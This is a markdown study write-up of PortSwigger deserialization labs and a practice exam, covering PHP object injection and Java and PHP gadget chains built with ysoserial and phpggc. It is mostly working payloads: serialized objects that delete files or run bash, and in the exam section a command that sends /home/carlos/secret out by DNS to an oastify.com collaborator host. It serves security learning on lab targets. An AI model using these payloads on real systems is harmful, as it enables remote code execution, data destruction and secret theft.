## Approach

1. Look for any serialized object
2. Trigger error on serialized object to identify technology used

> PHP serialized object
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"urflsosi6468s9rzhs8442dokwa7jdct";}
```

> Java serialized object
```java
rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBrOHdrbGd1b2d2NWY3b3V1cTB0eWpma2U5dnZhcDVkMXQABndpZW5lcg%3d%3d
```

3. Look for source code leaks that has object specification, sensitive functionalities, and magic methods
4. For [Java serialized object](#[2.%20Exploiting%20Java%20deserialization%20with%20Apache%20Commons](https%20//portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)) use `ysoserial` 
5. For [PHP known framework](#[3.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain](https%20//portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)) use `phpggc`
## Labs
### [1. Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

> [!NOTE] 
> - Arbitrary object injection is possible in the website due to session using PHP serialized object
> - A source code leak showing a PHP object with magic method `__destruct` that also has a functionality to delete files

**Confirm that there's serialized object**

> Server is using a serialized object for session handling
![](attachments/Pasted%20image%2020260108082953.png)

**Find a source code**

> - Accessing PHP file using browser editor with `~`
> - There's a PHP object used called **CustomTemplate**
> - Inside there's a magic method `__destruct()` invoked when a PHP script finish executing
> - The code inside it deletes a file provided by `lock_file_path` via `unlink()` method
![](attachments/Pasted%20image%2020260108083259.png)

**Inject arbitrary object**

> Provide the file to delete `/home/carlos/morale.txt`
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
![](attachments/Pasted%20image%2020260108083631.png)
### [2. Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

> [!NOTE] 
> Apache Commons Java deserialization in cookie allowing code execution due to insecure deserialization 

**Confirm that there's serialized object**

> Java serialized object
![](attachments/Pasted%20image%2020260108084241.png)

**Using Java pre-built gadget chains**

> - Using `ysoserial` to generate a java with CommonsCollections4 containing the payload to delete `/home/carlos/morale.txt`
> - Output is in `poc1`
> - Submit cookie with URL encoding
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > poc1
```
![](attachments/Pasted%20image%2020260108085124.png)

**Reading file**

> Encoded payload
```bash
echo -n 'nslookup `echo foo`.[BURP_COLLABORATOR]' | base64 -w 0
```

> Generate serialized object
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \     
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 'bash -c {echo,[B64_PAYLOAD]}|{base64,-d}|{bash,-i}' | base64 -w 0 > poc1
```

### [3. Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

> [!NOTE] 
> Insecure deserialization of PHP object using pre-built gadget chain for ***Symfony*** framework allowing code execution

**Confirm that there's serialized object**

> Cookie is using serialized PHP object as session management
![](attachments/Pasted%20image%2020260108085858.png)

**Confirm technology**

> Server is using ***Symfony*** for PHP, can be detected by supplying a malformed cookie
![](attachments/Pasted%20image%2020260108090117.png)

**Finding pre-built gadget chain**

> Using `phpggc` to find a possible gadget chain for the vulnerable ***Symfony*** version
```bash
phpggc -l symfony
```
![](attachments/Pasted%20image%2020260108090341.png)

**Generating a payload**

> Delete file
```bash
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

> Base64 encoded PHP object
```php
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

> Generate signature in hackvertor
```
<@hmac_sha1('[SECRET_KEY]')>[B64_PHP_OBJ]</@hmac_sha1>
```

> File reading
```bash
phpggc Symfony/RCE4 exec 'nslookup `echo foo`.[BURP_COLLABORATOR]' | base64 -w 0
```

> Base64 encoded PHP object
```php
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czo2NToibnNsb29rdXAgYGVjaG8gZm9vYC43aHBpaXhrbXdmbTRocXV1Zml5aHdhZnpicWhoNTg1d3Uub2FzdGlmeS5jb20iO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

## Practice Exam

> The final part of the practice exam is a **Deserialization** vuln, which can be seen from the `admin-prefs` cookie

> The magic byte that we see here is `H4sIAAAAAAAAA...` a gzip base64
> Look here for reference https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md

```bash
echo -n 'nslookup `cat /home/carlos/secret`.ppi8d5j2fvab9xq3btdusy7ad1js7qvf.oastify.com' | base64 -w 0
```

> How do i know it's `CommonsCollections6`? I don't, i just tried almost all of them
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections6 'bash -c {echo,bnNsb29rdXAgYGNhdCAvaG9tZS9jYXJsb3Mvc2VjcmV0YC5wcGk4ZDVqMmZ2YWI5eHEzYnRkdXN5N2FkMWpzN3F2Zi5vYXN0aWZ5LmNvbQ==}|{base64,-d}|{bash,-i}' | gzip | base64 -w 0 > poc1
```